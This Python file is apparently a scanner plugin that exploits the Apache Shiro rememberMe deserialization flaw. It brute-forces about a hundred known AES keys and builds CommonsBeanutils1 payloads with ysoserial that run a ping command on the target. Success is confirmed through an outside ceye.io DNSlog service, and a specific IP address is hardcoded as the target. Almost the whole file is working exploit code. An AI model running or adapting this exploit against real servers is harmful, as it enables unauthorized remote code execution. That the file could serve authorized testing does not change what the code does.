#!/usr/bin/env python
# -*- coding: utf-8 -*-

import base64
import os
import re
import subprocess
import uuid

import requests
from Crypto.Cipher import AES

import config.config


class shiro:

    def __init__(self):
        self.plugin = 'CommonsBeanutils1'



        self.keys = ['kPH+bIxk5D2deZiIxcaaaA==',
                '4AvVhmFLUs0KTA3Kprsdag==',
                'Z3VucwAAAAAAAAAAAAAAAA==',
                'fCq+/xW488hMTCD+cmJ3aQ==',
                '0AvVhmFLUs0KTA3Kprsdag==',
                '1AvVhdsgUs0FSA3SDFAdag==',
                '1QWLxg+NYmxraMoxAXu/Iw==',
                '25BsmdYwjnfcWmnhAciDDg==',
                '2AvVhdsgUs0FSA3SDFAdag==',
                '3AvVhmFLUs0KTA3Kprsdag==',
                '3JvYhmBLUs0ETA5Kprsdag==',
                'r0e3c16IdVkouZgk1TKVMg==',
                '5aaC5qKm5oqA5pyvAAAAAA==',
                '5AvVhmFLUs0KTA3Kprsdag==',
                '6AvVhmFLUs0KTA3Kprsdag==',
                '6NfXkC7YVCV5DASIrEm1Rg==',
                '6ZmI6I2j5Y+R5aSn5ZOlAA==',
                'cmVtZW1iZXJNZQAAAAAAAA==',
                '7AvVhmFLUs0KTA3Kprsdag==',
                '8AvVhmFLUs0KTA3Kprsdag==',
                '8BvVhmFLUs0KTA3Kprsdag==',
                '9AvVhmFLUs0KTA3Kprsdag==',
                'OUHYQzxQ/W9e/UjiAGu6rg==',
                'a3dvbmcAAAAAAAAAAAAAAA==',
                'aU1pcmFjbGVpTWlyYWNsZQ==',
                'bWljcm9zAAAAAAAAAAAAAA==',
                'bWluZS1hc3NldC1rZXk6QQ==',
                'bXRvbnMAAAAAAAAAAAAAAA==',
                'ZUdsaGJuSmxibVI2ZHc9PQ==',
                'wGiHplamyXlVB11UXWol8g==',
                'U3ByaW5nQmxhZGUAAAAAAA==',
                'MTIzNDU2Nzg5MGFiY2RlZg==',
                'L7RioUULEFhRyxM7a2R/Yg==',
                'a2VlcE9uR29pbmdBbmRGaQ==',
                'WcfHGU25gNnTxTlmJMeSpw==',
                'OY//C4rhfwNxCQAQCrQQ1Q==',
                '5J7bIJIV0LQSN3c9LPitBQ==',
                'f/SY5TIve5WWzT4aQlABJA==',
                'bya2HkYo57u6fWh5theAWw==',
                'WuB+y2gcHRnY2Lg9+Aqmqg==',
                'kPv59vyqzj00x11LXJZTjJ2UHW48jzHN',
                '3qDVdLawoIr1xFd6ietnwg==',
                'ZWvohmPdUsAWT3=KpPqda',
                'YI1+nBV//m7ELrIyDHm6DQ==',
                '6Zm+6I2j5Y+R5aS+5ZOlAA==',
                '2A2V+RFLUs+eTA3Kpr+dag==',
                '6ZmI6I2j3Y+R1aSn5BOlAA==',
                'SkZpbmFsQmxhZGUAAAAAAA==',
                '2cVtiE83c4lIrELJwKGJUw==',
                'fsHspZw/92PrS3XrPW+vxw==',
                'XTx6CKLo/SdSgub+OPHSrw==',
                'sHdIjUN6tzhl8xZMG3ULCQ==',
                'O4pdf+7e+mZe8NyxMTPJmQ==',
                'HWrBltGvEZc14h9VpMvZWw==',
                'rPNqM6uKFCyaL10AK51UkQ==',
                'Y1JxNSPXVwMkyvES/kJGeQ==',
                'lT2UvDUmQwewm6mMoiw4Ig==',
                'MPdCMZ9urzEA50JDlDYYDg==',
                'xVmmoltfpb8tTceuT5R7Bw==',
                'c+3hFGPjbgzGdrC+MHgoRQ==',
                'ClLk69oNcA3m+s0jIMIkpg==',
                'Bf7MfkNR0axGGptozrebag==',
                '1tC/xrDYs8ey+sa3emtiYw==',
                'ZmFsYWRvLnh5ei5zaGlybw==',
                'cGhyYWNrY3RmREUhfiMkZA==',
                'IduElDUpDDXE677ZkhhKnQ==',
                'yeAAo1E8BOeAYfBlm4NG9Q==',
                'cGljYXMAAAAAAAAAAAAAAA==',
                '2itfW92XazYRi5ltW0M2yA==',
                'XgGkgqGqYrix9lI6vxcrRw==',
                'ertVhmFLUs0KTA3Kprsdag==',
                '5AvVhmFLUS0ATA4Kprsdag==',
                's0KTA3mFLUprK4AvVhsdag==',
                'hBlzKg78ajaZuTE0VLzDDg==',
                '9FvVhtFLUs0KnA3Kprsdyg==',
                'd2ViUmVtZW1iZXJNZUtleQ==',
                'yNeUgSzL/CfiWw1GALg6Ag==',
                'NGk/3cQ6F5/UNPRh8LpMIg==',
                '4BvVhmFLUs0KTA3Kprsdag==',
                'MzVeSkYyWTI2OFVLZjRzZg==',
                'CrownKey==a12d/dakdad',
                'empodDEyMwAAAAAAAAAAAA==',
                'A7UzJgh1+EWj5oBFi+mSgw==',
                'YTM0NZomIzI2OTsmIzM0NTueYQ==',
                'c2hpcm9fYmF0aXMzMgAAAA==',
                'i45FVt72K2kLgvFrJtoZRw==',
                'U3BAbW5nQmxhZGUAAAAAAA==',
                'ZnJlc2h6Y24xMjM0NTY3OA==',
                'Jt3C93kMR9D5e8QzwfsiMw==',
                'MTIzNDU2NzgxMjM0NTY3OA==',
                'vXP33AonIp9bFwGl7aT7rA==',
                'V2hhdCBUaGUgSGVsbAAAAA==',
                'Z3h6eWd4enklMjElMjElMjE=',
                'Q01TX0JGTFlLRVlfMjAxOQ==',
                'ZAvph3dsQs0FSL3SDFAdag==',
                'Is9zJ3pzNh2cgTHB4ua3+Q==',
                'NsZXjXVklWPZwOfkvk6kUA==',
                'GAevYnznvgNCURavBhCr1w==',
                '66v1O8keKNV3TTcGPK1wzg==',
                'SDKOLKn2J1j/2BHjeZwAoQ==']

        self.dnslog = config.config.ceye_rawurl
        self.ceye_token=config.config.ceye_token

        self.ip_line_regex = re.compile(r'([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(\/[1-2][0-9])?)')
        self.JAR_FILE=config.config.ysoserial

    def ALL(self, args):
        self.url=args
        self.results=[]
        self.results.append(self.url)
        if self.dnslog == '' or self.JAR_FILE == '' or self.ceye_token == '':
            return '未配置DNSlog'

        self.poc()

        return self.results[:2]

    def poc(self):
        target = self.url.strip()
        r = requests.get(target, cookies={'rememberMe': '1'}, timeout=3, verify=False, allow_redirects=False)  # 发送验证请求
        if 'deleteMe' not in r.headers['Set-Cookie']:

            self.results.append("[-]没有启用rememberMe--" + target)
            return

        for key in self.keys:
            popen = subprocess.Popen(['java', '-jar',
                                      self.JAR_FILE, self.plugin, f'ping shiro.{self.dnslog}'],
                                     stdout=subprocess.PIPE)
            # 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节
            BS = AES.block_size
            # 按照加密规则按一定长度对齐,如果不够要要做填充对齐
            pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
            # AES的CBC加密模式
            mode = AES.MODE_CBC
            # 使用uuid4基于随机数模块生成16字节的 iv向量
            iv = uuid.uuid4().bytes
            # 实例化一个加密方式为上述的对象
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            # 用pad函数去处理yso的命令输出，生成的序列化数据
            file_body = pad(popen.stdout.read())
            # iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数
            base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))
            cookie = {
                "rememberMe": base64_rememberMe_value.decode()
            }

            requests.get(self.url, cookies=cookie,allow_redirects=True)
            ceye_url = "http://api.ceye.io/v1/records?token=" + self.ceye_token + "&type=http&filter=" + 'shiro.'+self.dnslog
            try:
                rsp = requests.get(ceye_url, timeout=10).json()
                if len(rsp["data"]) > 0:
                    self.results.append(f'存在shiro漏洞 key={key},plugins={self.plugin}')
                    break
                else:
                    continue
            except:
                pass


if __name__ == '__main__':
    url='http://43.143.165.217:8080'
    a=shiro()
    aa=a.ALL(url)
    print(aa)





